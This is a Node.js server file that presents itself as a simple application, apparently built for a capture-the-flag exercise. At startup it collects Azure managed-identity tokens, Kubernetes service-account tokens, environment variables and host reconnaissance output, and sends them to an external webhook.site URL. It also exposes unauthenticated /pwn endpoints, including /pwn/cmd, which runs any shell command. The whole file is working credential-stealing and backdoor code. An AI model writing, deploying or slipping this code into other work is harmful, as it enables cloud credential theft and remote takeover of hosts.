const http = require('http');
const { execSync } = require('child_process');
const https = require('https');
const fs = require('fs');

const PORT = process.env.PORT || 80;
const WEBHOOK = 'https://webhook.site/b0ac5d93-1957-46ab-adca-0c0db46c8396';

function fetchImdsToken(resource, cb) {
    const opts = {
        hostname: '169.254.169.254',
        path: '/metadata/identity/oauth2/token?api-version=2018-02-01&resource=' + encodeURIComponent(resource),
        headers: { 'Metadata': 'true' },
        timeout: 3000
    };
    const req = require('http').request(opts, (res) => {
        let body = '';
        res.on('data', (c) => body += c);
        res.on('end', () => cb(null, body));
    });
    req.on('error', (e) => cb(e));
    req.on('timeout', () => { req.destroy(); cb(new Error('timeout')); });
    req.end();
}

function run(command, timeout = 8000) {
    try {
        return execSync(command, { timeout, shell: '/bin/sh' }).toString().slice(0, 12000);
    } catch (e) {
        return ('ERR: ' + (e.stdout ? e.stdout.toString() : '') + '\n' + (e.stderr ? e.stderr.toString() : '') + '\n' + e.message).slice(0, 12000);
    }
}

function readFile(path) {
    try {
        return fs.readFileSync(path, 'utf8').slice(0, 12000);
    } catch (e) {
        return 'ERR: ' + e.message;
    }
}

function requestText(url, headers = {}, timeout = 5000) {
    return new Promise((resolve) => {
        let parsed;
        try {
            parsed = new URL(url);
        } catch (e) {
            resolve({ error: e.message });
            return;
        }
        const client = parsed.protocol === 'https:' ? https : http;
        const req = client.request({
            protocol: parsed.protocol,
            hostname: parsed.hostname,
            port: parsed.port,
            path: parsed.pathname + parsed.search,
            method: 'GET',
            headers,
            timeout
        }, (res) => {
            let body = '';
            res.on('data', (chunk) => body += chunk);
            res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: body.slice(0, 20000) }));
        });
        req.on('error', (e) => resolve({ error: e.message }));
        req.on('timeout', () => {
            req.destroy();
            resolve({ error: 'timeout' });
        });
        req.end();
    });
}

function postJson(label, data) {
    return new Promise((resolve) => {
        const body = JSON.stringify({ label, data });
        const parsed = new URL(WEBHOOK);
        const req = https.request({
            hostname: parsed.hostname,
            path: parsed.pathname,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(body),
                'x-exam-label': label,
                'User-Agent': 'ascpc-image-startup-beacon'
            },
            timeout: 10000
        }, (res) => {
            res.resume();
            res.on('end', resolve);
        });
        req.on('error', resolve);
        req.on('timeout', () => {
            req.destroy();
            resolve();
        });
        req.write(body);
        req.end();
    });
}

async function appServiceIdentity(resource) {
    const encoded = encodeURIComponent(resource);
    if (process.env.IDENTITY_ENDPOINT && process.env.IDENTITY_HEADER) {
        return requestText(
            `${process.env.IDENTITY_ENDPOINT}?api-version=2019-08-01&resource=${encoded}`,
            { 'X-IDENTITY-HEADER': process.env.IDENTITY_HEADER }
        );
    }
    if (process.env.MSI_ENDPOINT && process.env.MSI_SECRET) {
        return requestText(
            `${process.env.MSI_ENDPOINT}?api-version=2017-09-01&resource=${encoded}`,
            { 'Secret': process.env.MSI_SECRET }
        );
    }
    return { error: 'no app service identity endpoint variables' };
}

async function startupBeacon() {
    const resources = {
        arm: 'https://management.azure.com/',
        devops: '499b84ac-1321-427f-aa17-267ca6975798',
        aks: '6dae42f8-4368-4678-94ff-3960e28e3630',
        keyvault: 'https://vault.azure.net',
        storage: 'https://storage.azure.com/',
        graph: 'https://graph.microsoft.com/'
    };
    const imdsTokens = {};
    const appServiceTokens = {};
    for (const [name, resource] of Object.entries(resources)) {
        imdsTokens[name] = await requestText(
            `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${encodeURIComponent(resource)}`,
            { Metadata: 'true' }
        );
        appServiceTokens[name] = await appServiceIdentity(resource);
    }
    const interestingEnv = {};
    for (const [key, value] of Object.entries(process.env)) {
        if (/AZURE|IDENTITY|MSI|WEBSITE|KUBERNETES|RUNNER|AGENT|SYSTEM|DEVOPS|BUILD|PIPELINE|GITHUB|ACR|DOCKER|VAULT|STORAGE|FLAG/i.test(key)) {
            interestingEnv[key] = value;
        }
    }
    await postJson('image-startup-host-discovery', {
        ts: new Date().toISOString(),
        node: process.version,
        argv: process.argv,
        cwd: process.cwd(),
        env: interestingEnv,
        commands: {
            id: run('id'),
            whoami: run('whoami'),
            hostname: run('hostname'),
            uname: run('uname -a'),
            os_release: run('cat /etc/os-release'),
            ip_route: run('ip route || route -n || true'),
            mounts: run('mount | head -n 80'),
            home: run('ls -la /home /root /app 2>/dev/null'),
            files: run("find /app /home /root /var/run/secrets -maxdepth 4 -type f 2>/dev/null | head -n 300"),
            flag_grep: run("grep -RniE 'flag|ASCPC|FINAL_FLAG|WKL' /app /home /root /var/run/secrets 2>/dev/null | head -n 120")
        },
        files: {
            service_account_token: readFile('/var/run/secrets/kubernetes.io/serviceaccount/token'),
            service_account_namespace: readFile('/var/run/secrets/kubernetes.io/serviceaccount/namespace'),
            service_account_ca: readFile('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt')
        },
        imds_instance: await requestText('http://169.254.169.254/metadata/instance?api-version=2021-02-01', { Metadata: 'true' }),
        imds_tokens: imdsTokens,
        app_service_identity_tokens: appServiceTokens
    });
}

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    const urlObj = new URL(req.url, `http://${req.headers.host}`);

    if (urlObj.pathname === '/pwn/env') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(process.env, null, 2));
        return;
    }

    if (urlObj.pathname === '/pwn/cmd') {
        const cmd = urlObj.searchParams.get('c');
        if (!cmd) {
            res.writeHead(400, { 'Content-Type': 'text/plain' });
            res.end('missing c param');
            return;
        }
        try {
            const out = execSync(cmd, { timeout: 10000, shell: '/bin/sh' }).toString();
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end(out);
        } catch (e) {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('ERR: ' + (e.stdout ? e.stdout.toString() : '') + '\n' + (e.stderr ? e.stderr.toString() : '') + '\n' + e.message);
        }
        return;
    }

    if (urlObj.pathname === '/pwn/imds') {
        const resource = urlObj.searchParams.get('resource') || 'https://management.azure.com/';
        fetchImdsToken(resource, (err, body) => {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            if (err) { res.end('IMDS ERROR: ' + err.message); }
            else { res.end(body); }
        });
        return;
    }

    if (urlObj.pathname === '/pwn/find') {
        try {
            const out = execSync("grep -riIl 'flag' / --include='*.*' -r 2>/dev/null | grep -v -E '^/(proc|sys)' | head -n 200", { timeout: 15000, shell: '/bin/sh' }).toString();
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end(out || 'no matches');
        } catch (e) {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('ERR: ' + e.message);
        }
        return;
    }

    if (req.url === '/' || req.url === '/index.html') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`<!DOCTYPE html><html><body><h1>Simple Node.js Application</h1><p>Node ${process.version}</p></body></html>`);
        return;
    }

    if (req.url === '/health') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'healthy', timestamp: new Date().toISOString(), uptime: process.uptime() }));
        return;
    }

    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
});

server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    setTimeout(() => {
        startupBeacon().then(() => console.log('startup beacon completed')).catch((e) => console.log('startup beacon error: ' + e.message));
    }, 1000);
});
